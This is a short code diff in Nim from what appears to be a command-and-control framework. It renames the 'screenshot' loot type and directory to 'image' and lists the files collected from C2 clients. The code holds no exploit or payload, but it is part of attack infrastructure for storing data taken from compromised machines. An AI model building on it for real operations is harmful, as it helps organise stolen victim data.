@@ -1,9 +1,9 @@
-import os, strformat, strutils
+import os, strformat
 import types
 
 type 
   LootType* = enum
-    LootScreenshot, LootFile
+    LootImage, LootFile
 
 type
   Loot* = ref object
@@ -17,15 +17,15 @@ proc getLootDirectory*(client: C2Client): string =
 proc createLootDirectories*(client: C2Client) =
   let rootDirectory = getLootDirectory client
   createDir rootDirectory
-  createDir rootDirectory & "/screenshots/"
+  createDir rootDirectory & "/images/"
   createDir rootDirectory & "/files/"
 
 proc getLoot*(client: C2Client): seq[Loot] = 
   let rootDirectory = getLootDirectory client
-  for file in walkDir(rootDirectory & "/screenshots"):
+  for file in walkDir(rootDirectory & "/images"):
     if file.kind == pcFile:
       result.add Loot(
-        t: LootScreenshot,
+        t: LootImage,
         file: file.path
       )
   for file in walkDir(rootDirectory & "/files"):
